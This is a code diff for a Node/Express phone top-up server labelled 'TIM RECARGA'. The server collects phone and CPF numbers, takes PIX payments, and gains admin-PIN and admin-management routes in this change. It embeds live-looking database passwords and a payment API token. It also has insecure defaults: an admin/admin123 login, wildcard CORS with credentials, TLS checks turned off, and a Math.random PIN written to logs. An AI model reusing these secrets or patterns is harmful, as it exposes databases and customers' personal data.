@@ -5,6 +5,7 @@ const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
 const bodyParser = require('body-parser');
 const requestIp = require('request-ip');
+const crypto = require('crypto');
 const path = require('path');
 require('dotenv').config();
 
@@ -16,16 +17,16 @@ const JWT_EXPIRES = '24h';
 const PLUMIFY_PRODUCT_HASH = process.env.PLUMIFY_PRODUCT_HASH || 'lxpykbkgfl';
 const PLUMIFY_API_TOKEN = process.env.PLUMIFY_API_TOKEN || '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';
 
+const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://neondb_owner:npg_aP8rYnLRtq6f@ep-restless-glitter-b4fvqa2p-pooler.c-6.us-east-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require';
+
 app.use(cors({ origin: '*', credentials: true }));
 app.use(bodyParser.json({ limit: '10mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 app.use(requestIp.mw());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ============ POSTGRESQL DO CARALHO  ============
-
 const pool = new Pool({
-  connectionString: 'postgresql://recargabankerdb_user:EtGiOUgmuJxUZJbuQpUrEIdou8ZyzP9Y@dpg-db4oqup42hec73eeos4g-a/recargabankerdb',
+  connectionString: DATABASE_URL,
   ssl: { rejectUnauthorized: false },
   max: 5,
   idleTimeoutMillis: 30000,
@@ -68,6 +69,10 @@ function parseValorParaCents(valor) {
   return isNaN(n) ? 0 : Math.round(n * 100);
 }
 
+function gerarPin() {
+  return String(Math.floor(100000 + Math.random() * 900000));
+}
+
 async function logSeguranca(usuario, acao, ip, detalhes) {
   try {
     await pool.query(
@@ -100,10 +105,20 @@ async function initDatabase() {
         username VARCHAR(50) UNIQUE NOT NULL,
         senha_hash TEXT NOT NULL,
         nome VARCHAR(100),
-        email VARCHAR(100),
+        email VARCHAR(150),
+        is_master BOOLEAN DEFAULT false,
         ultimo_login TIMESTAMP,
         ip_login TEXT,
         criado_em TIMESTAMP DEFAULT NOW()
+      )
+    `);
+    await client.query(`ALTER TABLE admin_users ADD COLUMN IF NOT EXISTS is_master BOOLEAN DEFAULT false`);
+
+    await client.query(`
+      CREATE TABLE IF NOT EXISTS config (
+        chave VARCHAR(50) PRIMARY KEY,
+        valor TEXT,
+        atualizado_em TIMESTAMP DEFAULT NOW()
       )
     `);
 
@@ -172,21 +187,36 @@ async function initDatabase() {
       )
     `);
 
-    // Índices
     await client.query(`CREATE INDEX IF NOT EXISTS idx_recargas_status ON recargas(status);`);
     await client.query(`CREATE INDEX IF NOT EXISTS idx_payments_tid ON payments(transaction_id);`);
     await client.query(`CREATE INDEX IF NOT EXISTS idx_logs_data ON logs(data DESC);`);
 
-    // Admin padrão
+    // Admin master padrão
     const adminCheck = await client.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
     if (adminCheck.rows.length === 0) {
       const hashedPassword = bcrypt.hashSync('admin123', 10);
       await client.query(
-        `INSERT INTO admin_users (username, senha_hash, nome, email, ultimo_login, ip_login)
-         VALUES ($1, $2, $3, $4, NOW(), $5)`,
+        `INSERT INTO admin_users (username, senha_hash, nome, email, is_master, ultimo_login, ip_login)
+         VALUES ($1, $2, $3, $4, true, NOW(), $5)`,
         ['admin', hashedPassword, 'Administrador', 'admin@timrecarga.com', '127.0.0.1']
       );
-      console.log('Admin padrão criado: admin / admin123');
+      console.log('Admin master criado: admin / admin123');
+    } else {
+      const masters = await client.query('SELECT COUNT(*) FROM admin_users WHERE is_master = true');
+      if (parseInt(masters.rows[0].count) === 0) {
+        await client.query('UPDATE admin_users SET is_master = true WHERE username = $1', ['admin']);
+      }
+    }
+
+    // PIN de acesso administrativo
+    const pinCheck = await client.query('SELECT valor FROM config WHERE chave = $1', ['admin_pin']);
+    if (pinCheck.rows.length === 0) {
+      const pin = gerarPin();
+      await client.query(
+        'INSERT INTO config (chave, valor) VALUES ($1, $2)',
+        ['admin_pin', pin]
+      );
+      console.log('PIN administrativo gerado:', pin);
     }
 
     console.log('Banco de dados pronto.');
@@ -203,7 +233,6 @@ initDatabase();
 // ROTAS PÚBLICAS
 // ============================================================
 
-// CRIAR RECARGA + PIX (PLUMIFY)
 app.post('/api/create-sale', async (req, res) => {
   const { phone, cpf, value, bonus } = req.body;
   const ip = getClientIP(req);
@@ -277,7 +306,6 @@ app.post('/api/create-sale', async (req, res) => {
         [data.hash, phone, cpf, valorTexto, bonus || '', data.pix.pix_qr_code, ip]
       ).catch(e => console.log('Erro recargas:', e.message));
 
-      // Grava cliente (se ainda não existir pelo CPF)
       await pool.query(
         `INSERT INTO clientes (nome, cpf, telefone, ip)
          SELECT 'Cliente TIM', $1, $2, $3
@@ -307,7 +335,6 @@ app.post('/api/create-sale', async (req, res) => {
   }
 });
 
-// CONSULTAR STATUS
 app.get('/api/sale-status', async (req, res) => {
   try {
     const { transactionId } = req.query;
@@ -325,12 +352,10 @@ app.get('/api/sale-status', async (req, res) => {
     const status = raw === 'paid' ? 'PAID' : raw === 'pending' ? 'PENDING' : raw.toUpperCase();
     return res.json({ success: true, data: { status, transactionId } });
   } catch (error) {
-    console.error('Erro sale-status:', error);
     return res.status(500).json({ success: false, message: 'Erro ao consultar' });
   }
 });
 
-// WEBHOOK PLUMIFY
 app.post('/api/webhook/pagamento', async (req, res) => {
   const { hash, status } = req.body;
   if (status === 'paid' && hash) {
@@ -352,7 +377,6 @@ app.post('/api/webhook/pagamento', async (req, res) => {
   res.json({ received: true });
 });
 
-// VISITANTE
 app.post('/api/visitante', async (req, res) => {
   try {
     const { screen, pagina } = req.body;
@@ -379,7 +403,6 @@ app.post('/api/visitante', async (req, res) => {
 // ROTAS ADMIN
 // ============================================================
 
-// LOGIN
 app.post('/api/admin/login', async (req, res) => {
   const { username, password } = req.body;
   const ip = getClientIP(req);
@@ -415,7 +438,8 @@ app.post('/api/admin/login', async (req, res) => {
         id: result.rows[0].id,
         username: result.rows[0].username,
         nome: result.rows[0].nome || 'Administrador',
-        email: result.rows[0].email || ''
+        email: result.rows[0].email || '',
+        is_master: result.rows[0].is_master || false
       }
     });
   } catch (error) {
@@ -424,12 +448,11 @@ app.post('/api/admin/login', async (req, res) => {
   }
 });
 
-// VERIFY
 app.get('/api/admin/verify', authenticate, (req, res) => {
   res.json({ valid: true, user: req.user });
 });
 
-// TROCAR SENHA
+// ============ TROCAR SENHA ============
 app.post('/api/admin/trocar-senha', authenticate, async (req, res) => {
   const { senhaAtual, novaSenha } = req.body;
   const ip = getClientIP(req);
@@ -448,12 +471,165 @@ app.post('/api/admin/trocar-senha', authenticate, async (req, res) => {
     await logSeguranca(req.user.nome, 'troca_senha', ip, 'Senha alterada');
     res.json({ success: true, message: 'Senha alterada com sucesso' });
   } catch (error) {
-    console.error('Erro trocar senha:', error);
     res.status(500).json({ error: 'Erro ao alterar senha' });
   }
 });
 
-// DASHBOARD
+// ============ ATUALIZAR PRÓPRIOS DADOS ============
+app.put('/api/admin/perfil', authenticate, async (req, res) => {
+  const { nome, email } = req.body;
+  try {
+    await pool.query(
+      'UPDATE admin_users SET nome = $1, email = $2 WHERE id = $3',
+      [nome || null, email || null, req.user.id]
+    );
+    await logSeguranca(req.user.nome, 'editar_perfil', getClientIP(req), `Nome: ${nome}`);
+    res.json({ success: true });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// ============ PIN ADMINISTRATIVO ============
+app.get('/api/admin/pin', authenticate, async (req, res) => {
+  try {
+    const eu = await pool.query('SELECT is_master FROM admin_users WHERE id = $1', [req.user.id]);
+    if (!eu.rows[0]?.is_master) return res.status(403).json({ error: 'Apenas o master' });
+    const r = await pool.query('SELECT valor, atualizado_em FROM config WHERE chave = $1', ['admin_pin']);
+    if (r.rows.length === 0) {
+      const pin = gerarPin();
+      await pool.query('INSERT INTO config (chave, valor) VALUES ($1, $2)', ['admin_pin', pin]);
+      return res.json({ pin, atualizado_em: new Date() });
+    }
+    res.json({ pin: r.rows[0].valor, atualizado_em: r.rows[0].atualizado_em });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.post('/api/admin/pin/regenerar', authenticate, async (req, res) => {
+  try {
+    const eu = await pool.query('SELECT is_master FROM admin_users WHERE id = $1', [req.user.id]);
+    if (!eu.rows[0]?.is_master) return res.status(403).json({ error: 'Apenas o master' });
+    const pin = gerarPin();
+    await pool.query(
+      `INSERT INTO config (chave, valor, atualizado_em) VALUES ('admin_pin', $1, NOW())
+       ON CONFLICT (chave) DO UPDATE SET valor = $1, atualizado_em = NOW()`,
+      [pin]
+    );
+    await logSeguranca(req.user.nome, 'pin_regenerado', getClientIP(req), '');
+    res.json({ success: true, pin });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+async function verificarPin(pin) {
+  const r = await pool.query('SELECT valor FROM config WHERE chave = $1', ['admin_pin']);
+  if (r.rows.length === 0) return false;
+  return r.rows[0].valor === String(pin);
+}
+
+// ============ GERENCIAR ADMINS (precisa de PIN) ============
+app.get('/api/admin/admins', authenticate, async (req, res) => {
+  try {
+    const eu = await pool.query('SELECT is_master FROM admin_users WHERE id = $1', [req.user.id]);
+    if (!eu.rows[0]?.is_master) return res.status(403).json({ error: 'Apenas o administrador master' });
+    const result = await pool.query(
+      'SELECT id, username, nome, email, is_master, ultimo_login, ip_login, criado_em FROM admin_users ORDER BY id'
+    );
+    res.json(result.rows);
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.post('/api/admin/admins', authenticate, async (req, res) => {
+  const { username, password, nome, email, pin } = req.body;
+  const ip = getClientIP(req);
+
+  try {
+    const eu = await pool.query('SELECT is_master FROM admin_users WHERE id = $1', [req.user.id]);
+    if (!eu.rows[0]?.is_master) return res.status(403).json({ error: 'Apenas o administrador master' });
+
+    if (!await verificarPin(pin)) {
+      await logSeguranca(req.user.nome, 'criar_admin_pin_errado', ip, `Usuário: ${username}`);
+      return res.status(401).json({ error: 'PIN inválido' });
+    }
+
+    if (!username || !password) return res.status(400).json({ error: 'Usuário e senha são obrigatórios' });
+    if (password.length < 6) return res.status(400).json({ error: 'Senha precisa ter no mínimo 6 caracteres' });
+
+    const existe = await pool.query('SELECT id FROM admin_users WHERE username = $1', [username]);
+    if (existe.rows.length > 0) return res.status(400).json({ error: 'Este usuário já existe' });
+
+    const hashed = bcrypt.hashSync(password, 10);
+    const result = await pool.query(
+      `INSERT INTO admin_users (username, senha_hash, nome, email, is_master)
+       VALUES ($1, $2, $3, $4, false)
+       RETURNING id, username, nome, email, is_master, criado_em`,
+      [username, hashed, nome || username, email || null]
+    );
+
+    await logSeguranca(req.user.nome, 'criar_admin', ip, `Novo admin: ${username}`);
+    res.json({ success: true, admin: result.rows[0] });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.put('/api/admin/admins/:id', authenticate, async (req, res) => {
+  const { nome, email, novaSenha, pin } = req.body;
+  const ip = getClientIP(req);
+  try {
+    const eu = await pool.query('SELECT is_master FROM admin_users WHERE id = $1', [req.user.id]);
+    if (!eu.rows[0]?.is_master) return res.status(403).json({ error: 'Apenas o master' });
+
+    if (!await verificarPin(pin)) return res.status(401).json({ error: 'PIN inválido' });
+
+    if (novaSenha) {
+      if (novaSenha.length < 6) return res.status(400).json({ error: 'Nova senha precisa ter no mínimo 6 caracteres' });
+      const hashed = bcrypt.hashSync(novaSenha, 10);
+      await pool.query('UPDATE admin_users SET senha_hash = $1 WHERE id = $2', [hashed, req.params.id]);
+    }
+    await pool.query('UPDATE admin_users SET nome = $1, email = $2 WHERE id = $3', [
+      nome || null, email || null, req.params.id
+    ]);
+    await logSeguranca(req.user.nome, 'editar_admin', ip, `ID: ${req.params.id}`);
+    res.json({ success: true });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.delete('/api/admin/admins/:id', authenticate, async (req, res) => {
+  const { pin } = req.body;
+  const ip = getClientIP(req);
+  try {
+    const eu = await pool.query('SELECT is_master FROM admin_users WHERE id = $1', [req.user.id]);
+    if (!eu.rows[0]?.is_master) return res.status(403).json({ error: 'Apenas o master' });
+
+    if (!await verificarPin(pin)) {
+      await logSeguranca(req.user.nome, 'excluir_admin_pin_errado', ip, `ID: ${req.params.id}`);
+      return res.status(401).json({ error: 'PIN inválido' });
+    }
+
+    const id = parseInt(req.params.id);
+    if (id === req.user.id) return res.status(400).json({ error: 'Você não pode excluir a si mesmo' });
+
+    const alvo = await pool.query('SELECT username, is_master FROM admin_users WHERE id = $1', [id]);
+    if (alvo.rows.length === 0) return res.status(404).json({ error: 'Admin não encontrado' });
+    if (alvo.rows[0].is_master) return res.status(400).json({ error: 'Não pode excluir outro master' });
+
+    await pool.query('DELETE FROM admin_users WHERE id = $1', [id]);
+    await logSeguranca(req.user.nome, 'excluir_admin', ip, `Admin removido: ${alvo.rows[0].username}`);
+    res.json({ success: true });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// ============ DASHBOARD E LISTAS ============
 app.get('/api/admin/dashboard', authenticate, async (req, res) => {
   try {
     const totalRecargas = await pool.query('SELECT COUNT(*) FROM recargas');
@@ -491,12 +667,10 @@ app.get('/api/admin/dashboard', authenticate, async (req, res) => {
       recentRecargas: recargasRecentes.rows
     });
   } catch (error) {
-    console.error('Erro dashboard:', error);
     res.status(500).json({ error: error.message });
   }
 });
 
-// RECARGAS
 app.get('/api/admin/recargas', authenticate, async (req, res) => {
   try {
     const { status, search, limit = 200 } = req.query;
@@ -540,7 +714,6 @@ app.delete('/api/admin/recargas/:id', authenticate, async (req, res) => {
   }
 });
 
-// PAGAMENTOS
 app.get('/api/admin/pagamentos', authenticate, async (req, res) => {
   try {
     const result = await pool.query('SELECT * FROM payments ORDER BY criado_em DESC');
@@ -550,7 +723,6 @@ app.get('/api/admin/pagamentos', authenticate, async (req, res) => {
   }
 });
 
-// CLIENTES
 app.get('/api/admin/clientes', authenticate, async (req, res) => {
   try {
     const result = await pool.query('SELECT * FROM clientes ORDER BY criado_em DESC');
@@ -560,7 +732,6 @@ app.get('/api/admin/clientes', authenticate, async (req, res) => {
   }
 });
 
-// VISITANTES
 app.get('/api/admin/visitantes', authenticate, async (req, res) => {
   try {
     const result = await pool.query('SELECT * FROM visitantes ORDER BY timestamp DESC LIMIT 200');
@@ -573,14 +744,13 @@ app.get('/api/admin/visitantes', authenticate, async (req, res) => {
 app.delete('/api/admin/visitantes', authenticate, async (req, res) => {
   try {
     await pool.query('DELETE FROM visitantes');
-    await logSeguranca(req.user.nome, 'limpeza_visitantes', getClientIP(req), 'Visitantes limpos');
+    await logSeguranca(req.user.nome, 'limpeza_visitantes', getClientIP(req), '');
     res.json({ success: true });
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
 });
 
-// LOGS
 app.get('/api/admin/logs', authenticate, async (req, res) => {
   try {
     const limit = parseInt(req.query.limit) || 100;
@@ -594,14 +764,13 @@ app.get('/api/admin/logs', authenticate, async (req, res) => {
 app.delete('/api/admin/logs', authenticate, async (req, res) => {
   try {
     await pool.query('DELETE FROM logs');
-    await logSeguranca(req.user.nome, 'limpeza_logs', getClientIP(req), 'Logs limpos');
+    await logSeguranca(req.user.nome, 'limpeza_logs', getClientIP(req), '');
     res.json({ success: true });
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
 });
 
-// HEALTH
 app.get('/health', async (req, res) => {
   try {
     await pool.query('SELECT 1');
@@ -611,7 +780,6 @@ app.get('/health', async (req, res) => {
   }
 });
 
-// PÁGINAS
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
 app.get('/recarga/pagamento', (req, res) => res.sendFile(path.join(__dirname, 'public', 'recarga', 'pagamento.html')));
@@ -621,9 +789,7 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log('');
   console.log('=================================================');
   console.log('  TIM RECARGA - Servidor Online');
-  console.log('  Site:  http://localhost:' + PORT);
-  console.log('  Admin: http://localhost:' + PORT + '/admin');
-  console.log('  Login: admin / admin123');
+  console.log('  Porta: ' + PORT);
   console.log('=================================================');
   console.log('');
 });
